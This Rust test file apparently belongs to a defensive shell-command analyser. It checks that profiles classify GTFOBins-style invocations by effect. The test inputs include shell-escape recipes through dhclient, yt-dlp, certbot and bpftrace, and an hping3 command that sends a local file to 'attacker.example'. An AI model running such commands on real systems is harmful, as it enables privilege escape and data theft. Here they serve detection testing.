//! Static GTFOBins 30h group B profile checks. Recipes remain inert data.
use caushell_parse::parse_command;
use caushell_profile::{
    BoundInvocation, BoundValue, EffectKind, InvocationRuntimeContext, ProfileRegistry,
    ResolveInvocationResult, StreamInputMode, StreamOutputMode, load_command_profile_from_str,
    resolve_invocation,
};
use caushell_types::ShellKind;

const PROFILES: [(&str, &str); 10] = [
    (
        "ansible-test",
        include_str!("../profiles/ansible-test.yaml"),
    ),
    ("cdist", include_str!("../profiles/cdist.yaml")),
    (
        "check_ssl_cert",
        include_str!("../profiles/check_ssl_cert.yaml"),
    ),
    ("dhclient", include_str!("../profiles/dhclient.yaml")),
    ("dnsmasq", include_str!("../profiles/dnsmasq.yaml")),
    ("pdb", include_str!("../profiles/pdb.yaml")),
    ("hping3", include_str!("../profiles/hping3.yaml")),
    ("yt-dlp", include_str!("../profiles/yt-dlp.yaml")),
    ("certbot", include_str!("../profiles/certbot.yaml")),
    ("bpftrace", include_str!("../profiles/bpftrace.yaml")),
];

fn registry() -> ProfileRegistry {
    ProfileRegistry::from_profiles(
        PROFILES
            .iter()
            .map(|(_, source)| load_command_profile_from_str(source).unwrap())
            .collect(),
    )
    .unwrap()
}

fn bind(command: &str) -> BoundInvocation {
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    match resolve_invocation(
        &registry(),
        &parsed.commands[0],
        InvocationRuntimeContext::new(),
    ) {
        ResolveInvocationResult::Resolved(resolved) => resolved.bound,
        ResolveInvocationResult::SelectionError {
            partial_bound,
            error,
            ..
        } => panic!("{command}: {error:?}; partial={partial_bound:#?}"),
        other => panic!("{command}: {other:?}"),
    }
}

fn has_effect(bound: &BoundInvocation, expected: EffectKind) -> bool {
    bound.effects.iter().any(|effect| effect.kind == expected)
}

fn has_parameter(bound: &BoundInvocation, slot: &str, expected: &str) -> bool {
    bound.bound_parameters.iter().any(|parameter| {
        parameter.name.as_str() == slot
            && parameter
                .values
                .iter()
                .any(|value| matches!(value, BoundValue::Argument { text, .. } if text == expected))
    })
}

#[test]
fn all_ten_profiles_load_as_independent_native_profiles() {
    for (name, source) in PROFILES {
        let profile =
            load_command_profile_from_str(source).unwrap_or_else(|error| panic!("{name}: {error}"));
        assert_eq!(profile.identity.canonical_name.as_str(), name);
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/source_research"),
            "{name}"
        );
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/known_limitations"),
            "{name}"
        );
    }
    let registry = registry();
    for name in PROFILES.map(|(name, _)| name) {
        assert!(registry.lookup(name).profile.is_some(), "{name}");
    }
}

#[test]
fn native_shell_and_helper_callbacks_bind_without_invented_trailing_argv() {
    let help = bind("ansible-test --help");
    assert_eq!(help.form_id.as_str(), "information");
    assert!(!has_effect(&help, EffectKind::ExecutePayload), "{help:#?}");

    let ansible = bind("ansible-test shell");
    assert_eq!(ansible.form_id.as_str(), "test_environment_shell");
    assert!(
        has_effect(&ansible, EffectKind::ExecutePayload),
        "{ansible:#?}"
    );
    assert!(
        has_effect(&ansible, EffectKind::OpenInteractiveEscapeSurface),
        "{ansible:#?}"
    );

    let cdist = bind("cdist shell -s /bin/sh");
    assert_eq!(cdist.form_id.as_str(), "selected_manifest_shell");
    assert!(
        has_parameter(&cdist, "selected_shell", "/bin/sh"),
        "{cdist:#?}"
    );
    assert!(
        has_effect(&cdist, EffectKind::DispatchCommand),
        "{cdist:#?}"
    );

    let checker = bind("check_ssl_cert --grep-bin /tmp/check-helper -H example.com");
    assert_eq!(checker.form_id.as_str(), "custom_grep_helper");
    assert!(
        has_parameter(&checker, "grep_helper", "/tmp/check-helper"),
        "{checker:#?}"
    );
    assert!(
        has_parameter(&checker, "grep_helper_path", "/tmp/check-helper"),
        "{checker:#?}"
    );
    assert!(
        has_parameter(&checker, "server", "example.com"),
        "{checker:#?}"
    );
    assert!(has_effect(&checker, EffectKind::ReadPath), "{checker:#?}");
    assert!(
        has_effect(&checker, EffectKind::ExecutePayload),
        "{checker:#?}"
    );
    assert!(
        !has_effect(&checker, EffectKind::DispatchCommand),
        "{checker:#?}"
    );

    let dhcp = bind("dhclient -sf /bin/sh eth0");
    assert_eq!(dhcp.form_id.as_str(), "selected_network_script");
    assert!(
        has_parameter(&dhcp, "network_script", "/bin/sh"),
        "{dhcp:#?}"
    );
    assert!(
        has_parameter(&dhcp, "network_script_path", "/bin/sh"),
        "{dhcp:#?}"
    );
    assert!(has_parameter(&dhcp, "interface", "eth0"), "{dhcp:#?}");
    assert!(has_effect(&dhcp, EffectKind::ReadPath), "{dhcp:#?}");
    assert!(has_effect(&dhcp, EffectKind::ExecutePayload), "{dhcp:#?}");
    assert!(!has_effect(&dhcp, EffectKind::DispatchCommand), "{dhcp:#?}");
}

#[test]
fn dnsmasq_shell_command_is_separate_from_configuration_file_data() {
    let command = bind("dnsmasq --conf-script 'printf native'");
    assert_eq!(command.form_id.as_str(), "execute_configuration_script");
    assert!(
        has_parameter(&command, "conf_script", "printf native"),
        "{command:#?}"
    );
    assert!(
        has_effect(&command, EffectKind::ExecutePayload),
        "{command:#?}"
    );
    let stream = command.stream_contract.as_ref().unwrap();
    assert_eq!(
        stream.stdin_mode,
        StreamInputMode::DataOptional,
        "native popen child inherits caller stdin"
    );
    assert_eq!(
        stream.stdout_mode,
        StreamOutputMode::Opaque,
        "dnsmasq consumes the command pipe internally"
    );
    assert!(
        has_effect(&command, EffectKind::DispatchCommand),
        "{command:#?}"
    );

    let config = bind("dnsmasq --conf-file /tmp/dnsmasq.conf");
    assert!(has_effect(&config, EffectKind::LoadConfig), "{config:#?}");
    assert!(
        !has_effect(&config, EffectKind::ExecutePayload),
        "{config:#?}"
    );
    for command in ["dnsmasq --help", "dnsmasq --version"] {
        let information = bind(command);
        assert_eq!(
            information.form_id.as_str(),
            "information",
            "{command}: {information:#?}"
        );
        assert!(
            !has_effect(&information, EffectKind::ExecutePayload),
            "{command}: {information:#?}"
        );
    }
}

#[test]
fn pdb_script_and_repl_remain_distinct_python_boundaries() {
    let debugger = bind("pdb /tmp/project/target.py");
    assert_eq!(debugger.form_id.as_str(), "debug_python_script");
    assert!(
        has_parameter(&debugger, "script_path", "/tmp/project/target.py"),
        "{debugger:#?}"
    );
    assert!(has_effect(&debugger, EffectKind::ReadPath), "{debugger:#?}");
    assert!(
        has_effect(&debugger, EffectKind::ExecutePayload),
        "{debugger:#?}"
    );
    assert!(
        has_effect(&debugger, EffectKind::OpenInteractiveEscapeSurface),
        "{debugger:#?}"
    );
}

#[test]
fn hping3_tcl_repl_and_file_transfer_have_opposite_effects() {
    let repl = bind("hping3");
    assert_eq!(repl.form_id.as_str(), "interactive_tcl_repl");
    assert!(has_effect(&repl, EffectKind::ExecutePayload), "{repl:#?}");
    assert!(
        has_effect(&repl, EffectKind::OpenInteractiveEscapeSurface),
        "{repl:#?}"
    );
    assert!(!has_effect(&repl, EffectKind::ReadPath), "{repl:#?}");
    assert!(!has_effect(&repl, EffectKind::DispatchCommand), "{repl:#?}");

    let help = bind("hping3 --help");
    assert_eq!(help.form_id.as_str(), "information");
    assert!(!has_effect(&help, EffectKind::ExecutePayload), "{help:#?}");
    let receiver = bind("hping3 --icmp --listen marker --dump");
    assert_eq!(
        receiver.form_id.as_str(),
        "receive_and_dump_packets",
        "{receiver:#?}"
    );
    assert!(
        !has_effect(&receiver, EffectKind::OpenInteractiveEscapeSurface),
        "{receiver:#?}"
    );

    let upload =
        bind("hping3 attacker.example --icmp --data 999 --sign marker --file /tmp/input.bin");
    assert_eq!(upload.form_id.as_str(), "transmit_file_to_endpoint");
    assert!(
        has_parameter(&upload, "target", "attacker.example"),
        "{upload:#?}"
    );
    assert!(
        has_parameter(&upload, "file_data", "/tmp/input.bin"),
        "{upload:#?}"
    );
    assert!(has_effect(&upload, EffectKind::ReadPath), "{upload:#?}");
    assert!(
        has_effect(&upload, EffectKind::NetworkEndpoint),
        "{upload:#?}"
    );
    assert!(
        !has_effect(&upload, EffectKind::ExecutePayload),
        "{upload:#?}"
    );
}

#[test]
fn yt_dlp_exec_is_a_download_callback_and_plain_download_has_none() {
    let callback = bind("yt-dlp https://media.example/watch --exec '/bin/sh #'");
    assert_eq!(callback.form_id.as_str(), "download_with_shell_exec");
    assert!(
        has_parameter(&callback, "exec_payload", "/bin/sh #"),
        "{callback:#?}"
    );
    assert!(
        has_effect(&callback, EffectKind::NetworkEndpoint),
        "{callback:#?}"
    );
    assert!(
        has_effect(&callback, EffectKind::WritePath),
        "{callback:#?}"
    );
    assert!(
        has_effect(&callback, EffectKind::ExecutePayload),
        "{callback:#?}"
    );

    let download = bind("yt-dlp https://media.example/watch");
    assert_eq!(download.form_id.as_str(), "download_media");
    assert!(
        has_effect(&download, EffectKind::NetworkEndpoint),
        "{download:#?}"
    );
    assert!(
        has_effect(&download, EffectKind::WritePath),
        "{download:#?}"
    );
    assert!(
        !has_effect(&download, EffectKind::ExecutePayload),
        "{download:#?}"
    );

    let templated = bind("yt-dlp https://media.example/watch --exec 'after_move:%(title)s'");
    assert_eq!(
        templated.form_id.as_str(),
        "download_with_opaque_exec_template",
        "{templated:#?}"
    );
    assert!(
        has_parameter(&templated, "exec_text", "after_move:%(title)s"),
        "{templated:#?}"
    );
    assert!(
        !has_parameter(&templated, "exec_payload", "after_move:%(title)s"),
        "{templated:#?}"
    );
    assert!(
        has_effect(&templated, EffectKind::ExecutePayload),
        "{templated:#?}"
    );

    let help = bind("yt-dlp --help");
    assert_eq!(help.form_id.as_str(), "information");
    assert!(!has_effect(&help, EffectKind::ExecutePayload), "{help:#?}");
}

#[test]
fn certbot_certonly_and_renewal_hooks_follow_native_trigger_boundaries() {
    let request = bind(
        "certbot certonly -n -d example.com --dry-run --pre-hook '/bin/sh 1>&0 2>&0' --config-dir . --logs-dir . --work-dir .",
    );
    assert_eq!(request.form_id.as_str(), "obtain_certificate_with_hooks");
    assert!(
        has_parameter(&request, "pre_hook_payload", "/bin/sh 1>&0 2>&0"),
        "{request:#?}"
    );
    assert!(
        has_effect(&request, EffectKind::ExecutePayload),
        "{request:#?}"
    );
    assert!(
        has_effect(&request, EffectKind::NetworkEndpoint),
        "{request:#?}"
    );
    assert!(has_effect(&request, EffectKind::WritePath), "{request:#?}");

    let renewal = bind("certbot renew --dry-run --pre-hook 'echo pre' --post-hook 'echo post'");
    assert_eq!(renewal.form_id.as_str(), "renewal_pre_post_hooks");
    assert!(
        has_effect(&renewal, EffectKind::ExecutePayload),
        "{renewal:#?}"
    );

    let skipped_deploy = bind("certbot renew --dry-run --deploy-hook 'echo deploy'");
    assert_eq!(
        skipped_deploy.form_id.as_str(),
        "renewal_deploy_hook_skipped_dry_run"
    );
    assert!(
        !has_effect(&skipped_deploy, EffectKind::ExecutePayload),
        "{skipped_deploy:#?}"
    );
    assert!(
        has_parameter(&skipped_deploy, "deploy_hook_text", "echo deploy"),
        "{skipped_deploy:#?}"
    );
    assert!(
        !has_parameter(&skipped_deploy, "deploy_hook_payload", "echo deploy"),
        "{skipped_deploy:#?}"
    );

    let enabled_deploy =
        bind("certbot renew --dry-run --run-deploy-hooks --deploy-hook 'echo deploy'");
    assert_eq!(enabled_deploy.form_id.as_str(), "renewal_deploy_hook");
    assert!(
        has_effect(&enabled_deploy, EffectKind::ExecutePayload),
        "{enabled_deploy:#?}"
    );
}

#[test]
fn bpftrace_source_and_child_command_keep_native_languages_separate() {
    let source = r#"bpftrace --unsafe -e 'BEGIN { system("/bin/sh 1<&0"); exit() }'"#;
    let program = bind(source);
    assert_eq!(program.form_id.as_str(), "inline_bpf_program");
    assert!(
        has_parameter(
            &program,
            "program",
            r#"BEGIN { system("/bin/sh 1<&0"); exit() }"#
        ),
        "{program:#?}"
    );
    assert!(
        has_effect(&program, EffectKind::ExecutePayload),
        "{program:#?}"
    );
    assert!(
        !has_effect(&program, EffectKind::DispatchCommand),
        "{program:#?}"
    );

    let child = bind("bpftrace -c /bin/sh -e 'END { exit() }'");
    assert_eq!(child.form_id.as_str(), "bpf_program_with_child_command");
    assert!(
        has_parameter(&child, "child_command_payload", "/bin/sh"),
        "{child:#?}"
    );
    assert!(has_effect(&child, EffectKind::ExecutePayload), "{child:#?}");
    assert!(
        has_effect(&child, EffectKind::DispatchCommand),
        "{child:#?}"
    );
    assert!(
        !has_parameter(&child, "child_command_payload", "END { exit() }"),
        "{child:#?}"
    );

    let multi = bind("bpftrace -c 'sh -c id' -e 'END { exit() }'");
    assert_eq!(multi.form_id.as_str(), "bpf_program_with_multitoken_child");
    assert!(
        !has_effect(&multi, EffectKind::DispatchCommand),
        "{multi:#?}"
    );
    assert!(has_effect(&multi, EffectKind::ExecutePayload), "{multi:#?}");
}
